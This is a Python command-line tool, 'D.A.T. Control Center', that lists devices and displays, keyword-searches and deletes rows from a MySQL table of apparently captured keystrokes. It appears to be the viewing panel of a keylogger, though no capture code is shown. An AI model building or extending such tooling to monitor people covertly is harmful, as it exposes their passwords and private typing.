

from termcolor import colored
from colorama import init
import tkinter
from tkinter import *
from tkinter import ttk
import mysql.connector



init()#allow colored text to run on windows machines
class ResultsWindow:
		def insert_data(self,list ,listbox):
			for data in list:
				listbox.insert('end' , data)

		def create_window(self , list):
			self.root = tkinter.Tk()
			listbox = tkinter.Listbox(self.root)
			listbox.pack(side = LEFT, fill = BOTH)
			verticalscrollbar = tkinter.Scrollbar(self.root)
			verticalscrollbar.pack(side = RIGHT, fill = 'y')
			listbox.config(width = 100 , height = 100)
			listbox.config(yscrollcommand = verticalscrollbar.set) 
			verticalscrollbar.config(command = listbox.yview) 
			self.insert_data(list ,listbox)

				
class DatabaseHandler:
		def __init__ (self):
			self.database = mysql.connector.connect(host = "localhost" , user= "test" , password = "test", database = "test")
			self.cursor = self.database.cursor(buffered=True)

		def string_searcher(self, word,results):
			matching_rows = []
			for row in results:
				if str(row).find(str(word)) != -1: # If the word is found.
					matching_rows.append(row)
			return matching_rows

		def search_all_data(self):
			Prompt = input("Word?>")
			if len(Prompt) < 1:
				print("Make Sure you Populate for the Search")
			else:
				
				self.cursor.execute("SELECT rowcontents FROM DeviceKeyStrokes5")
				if self.string_searcher(Prompt,self.cursor.fetchall()) == []: #if there is no matching words
					print("No Results for:" +colored(Prompt ,"red"))
				else:
					self.cursor.execute("SELECT rowcontents FROM DeviceKeyStrokes5")
					gui = ResultsWindow()
					title = "Results For Row Contents like:" + "("+Prompt+")"
					self.display_window(gui ,title ,self.string_searcher(Prompt,self.cursor.fetchall()))
			self.main() 

		def erase(self,inputmessage,query,sucessmessage, abortmessage):
			Prompt = input(inputmessage)
			if Prompt == "y":
				self.cursor.execute(query)
				self.database.commit()
				print(colored( sucessmessage , "green"))
			else:
				print(colored(abortmessage  , "red"))

		def search_data(self):
			Prompt = input("Device Name?>")
			Prompt2 = input("Word?>")
			if len(Prompt) < 1 or len(Prompt2) < 1  :
				print("Make Sure You Populate for the Search")
			else:
				self.cursor.execute("SELECT rowcontents FROM DeviceKeyStrokes5 WHERE devicename = %s" , (Prompt,))
				if self.string_searcher(Prompt2,self.cursor.fetchall()) == []: #if there is no matching words
					print("No Results for:" +colored(Prompt2 ,"red"))
				else:
					self.cursor.execute("SELECT rowcontents FROM DeviceKeyStrokes5 WHERE devicename = %s" , (Prompt,))
					gui = ResultsWindow()
					title = "Results For Row Contents like:" + "("+Prompt2+")" + "from the device:" + "(" + Prompt+")"
					self.display_window(gui ,title ,self.string_searcher(Prompt2,self.cursor.fetchall()))
			self.main()
			
		def display_window(self , gui ,title,list):
			gui.create_window(list)
			gui.root.title(title)
			gui.root.mainloop()


		def display_log(self):
			Prompt = input("What is the device name?> ")
			Prompt2 = input("What row number would you like to view?(the number of the log row)>")
			gui = ResultsWindow()
			self.cursor.execute("SELECT  rowcontents FROM DeviceKeyStrokes5 WHERE Linenumber=%s AND devicename = %s" , (Prompt2,Prompt,) )
			if self.cursor.fetchall() == []:
				print("No Log Found using the device name :" + str(Prompt) + "and the line number" + str(Prompt2))
			else:
				self.cursor.execute("SELECT  rowcontents FROM DeviceKeyStrokes5 WHERE Linenumber=%s AND devicename = %s" , (Prompt2,Prompt,) )
				title = "Results for (DeviceName :"+Prompt + ") and (Row Number:" +Prompt2+")"
				self.display_window(gui,title ,self.cursor.fetchall())
			self.main()

		def display_all_logs(self,query):
			self.cursor.execute(query)
			for row in self.cursor.fetchall():
				print(row)
			self.main()

		def display_logs(self,query):
			Prompt = input("Device?>")
			if len(Prompt) < 1:
				print("Make Sure You populate for the device")
			else:
				self.cursor.execute(query , (Prompt,))
				if self.cursor.fetchall() == [] :
					print("No Results for device:" +colored(Prompt ,"red"))
				else:
					self.cursor.execute(query , (Prompt,))
					gui = ResultsWindow()
					title = "Results For Row Contents From " + "Device:"+"("+Prompt+")"
					self.display_window(gui ,title ,self.cursor.fetchall())
			self.main()




		def display_devices(self):
			self.cursor.execute("SELECT * FROM users")
			for row in self.cursor.fetchall():
				print(row)
			self.main()


		def print_help(self):
			print(colored("--Commands-- of Version: 1.0",'green'))
			print(colored("display devices:","blue")+ " will return a list of all the devices that is inside of the database!!")
			print(colored("display log:","blue")+"will allow you to view a row that belong to a device, displayed in a G.U.I . ")
			print(colored("display logs:","blue")+"will allow you to view all row content that belong to a device, displayed in a G.U.I . ")
			print(colored("display logs ordered:", "blue") + "Will allow you to view all row content that belongs to a device  displayed in a G.U.I , ordered by the date.")
			print(colored("display all logs:" , "blue") + "Will display all row contents that belong to all devices(un-orded).")
			print(colored("display all logs ordered :" , "blue") + "Will display all row contents that belong to all devices(ordered).")
			print(colored("search data:","blue")+" will allow you to search database contents for a key word(one device)")
			print(colored("search all data:","blue")+"will allow you to search database contents for a key word(all devices)")
			print(colored("erase everything:" , "red")  +"This will completely remove all data , including users")
			print(colored("erase  all logs:" , "red") +"This will completely remove all logs")
			self.main()
class interface(DatabaseHandler) :
	def __init__(self):
		DatabaseHandler.__init__(self)

	def main(self):
		while True != False:
			print(colored("D.A.T. " , "green") + colored("Version 1.0 ", "blue") + colored("Control Center~", "red") )
			Prompt = input("# ")
			if Prompt == "display devices":
				self.display_devices()
			elif Prompt == "help":
				self.print_help()
			elif Prompt == "display all logs":
				self.display_all_logs("SELECT  DeviceID ,rowcontents FROM DeviceKeyStrokes5")
			elif Prompt == "display all logs ordered":
				self.display_all_logs("SELECT  DeviceID ,rowcontents FROM DeviceKeyStrokes5 ORDER BY date ASC")
			elif Prompt == "display log":
				self.display_log()
			elif Prompt == "display logs":
				self.display_logs("SELECT rowcontents FROM DeviceKeyStrokes5 WHERE devicename = %s")
			elif Prompt == "display logs ordered":
				self.display_logs("SELECT rowcontents FROM DeviceKeyStrokes5 WHERE devicename = %s ORDER BY Linenumber ASC")
			elif Prompt == "search all data":
				self.search_all_data()
			elif Prompt == "search data":
				self.search_data()
			elif Prompt == "erase logs":
				self.erase("Are You Sure You Would Like to Remove All Logs?[y,n]",
						   "DELETE FROM DeviceKeyStrokes5",
						   "All Logs removed!!",
						   "Aborted Removing all Logs!!")
				self.main()
			elif Prompt == "erase everything":
				self.erase("Are You Sure You Would Like to Remove All Logs?[y,n]",
						   "DELETE FROM DeviceKeyStrokes5",
						   "All Logs removed!!",
						   "Aborted Removing all Logs!!")
				self.erase("Are You Sure You Would Like to Remove All users?[y,n]",
							"DELETE FROM users",
							"All Users Removed!!",
							"Aborted removing all users")
				print("   ")
				self.main()
				


				



			elif Prompt == "end" :
				quit()
			   
			else:
				print(" ")
				print(colored("Command Not Found", "red"))
				print("To list the commands enter:help")
				print(" ")


if __name__ == "__main__":
	interface().main()
